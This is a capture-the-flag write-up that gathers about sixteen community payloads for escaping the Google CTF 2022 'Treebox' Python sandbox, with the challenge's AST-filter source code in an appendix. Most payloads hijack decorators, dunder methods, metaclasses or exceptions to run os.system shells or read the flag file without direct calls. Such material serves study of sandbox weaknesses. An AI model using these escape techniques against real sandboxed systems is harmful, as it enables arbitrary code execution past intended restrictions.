## Treebox (Misc) - Google CTF 2022

Everybody's solutions were so interesting that I had to collate them all.

### Python Sandbox Constraints

- no imports
- no function calls

### Solutions

1. @Enyei

```python
@eval
@input
def lol():
  pass
...
print(open('./flag').read())
```

2. @free food

```python
class a:
  pass
a.__class_getitem__ = exec
a["os.system('bash')"]
```

3. @zeyu2001

- Close but not close enough

```python
os.environ['PYTHONINSPECT'] = 'a'
```

- if this environment variable is set, it turns the python into interactive mode, but does not work against remote (probably needs a proper tty shell)

4. @Trixter

```python
class A(BaseException):
    def __init__(self):
        self.__class__.__add__ = os.system

    def __str__(self):
        return self + "cat flag"

raise A
```

- `raise A` instantiates the

5. @splitline

```python
@eval
@'__import__("os").system("sh")'.format
class _:pass
```

6. @Blupper

```python
sys.stdout.flush=sys.breakpointhook
```

7. @fourleggedoctopus

```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```

8. @aza

- very similar concept to payload number 2

```python
class T(BaseException):
    __getitem__=os.system

try:
    raise T
except T as e:
    e['cat flag']
```

9. @dogelition_main

- dunder methods and metaclasses

```python
class MyClass(type):
    __instancecheck__ = os.system

class MyClass2(metaclass=MyClass):
    pass

match "/bin/sh":
    case MyClass2():
        pass
```

10. @ContronThePanda

```python
def os_str(x): return 'os'

@__import__
@os_str
def os(): pass

def cmd_str(x): return 'cat flag'

@os.system
@cmd_str
def ret(): pass
```

- use of decorators which was well explained by @BitShift in the discord channel (I'm basically copying his response)
- decorators mean: please call the function I just named, passing the thing I decorated as the first arg

```python
@foo
def bar():
  pass
```

is equivalent to

```python
def tmp_bar():
  pass

bar = foo(bar)
```

11. @OfficialBenko

```python
class Exploit(BaseException):
    pass

Exploit.__eq__ = open
Exploit.__gt__ = print

try:
    raise Exploit
except Exploit as exploit:
    a = exploit == "flag"
    Exploit.__lt__ = a.read
    b = exploit < None
    exploit > b
```

12. @harrier

```python
global os
class M(type):
    self = "ls"
    pass
class A(metaclass=M):
    pass
M.__add__ = os.system
assert f"{A + 'sh'}" == True
```

13. [Author's Solution](https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py)

```python
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```

14. @Theos (not his)

```python
@exec
@input
class x:0
...
print(open('./flag').read())
```

15. @Quenouille

```python
license._Printer__filenames = ['flag']
sys.stderr.flush = license
x = 6/0
```

16. @温柔小 🐖

```python
os.environ.__class__.__contains__ = os.system
'cat flag' in os.environ
```

16. @crazyman

```python
tree.__class__.__getitem__ = eval
tree["__import__('os').system('cat flag')"]
```

- more concise version of payload number 2

### Appendix

Source code

```python
#!/usr/bin/python3 -u
#
# Flag is in a file called "flag" in cwd.
#
# Quote from Dockerfile:
#   FROM ubuntu:22.04
#   RUN apt-get update && apt-get install -y python3
#
import ast
import sys
import os

def verify_secure(m):
  for x in ast.walk(m):
    match type(x):
      case (ast.Import|ast.ImportFrom|ast.Call):
        print(f"ERROR: Banned statement {x}")
        return False
  return True

abspath = os.path.abspath(__file__)
dname = os.path.dirname(abspath)
os.chdir(dname)

print("-- Please enter code (last line must contain only --END)")
source_code = ""
while True:
  line = sys.stdin.readline()
  if line.startswith("--END"):
    break
  source_code += line

tree = compile(source_code, "input.py", 'exec', flags=ast.PyCF_ONLY_AST)
if verify_secure(tree):  # Safe to execute!
  print("-- Executing safe code:")
  compiled = compile(source_code, "input.py", 'exec')
  exec(compiled)

```

### Additional Notes

- Found some other cool resources of python sandboxes escape while researching

- [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
- Escaping sandbox by writing to `/proc/self/mem`. [Writeup])(https://blog.mheistermann.de/2014/04/14/plaidctf-2014-nightmares-pwnables-375-writeup/)
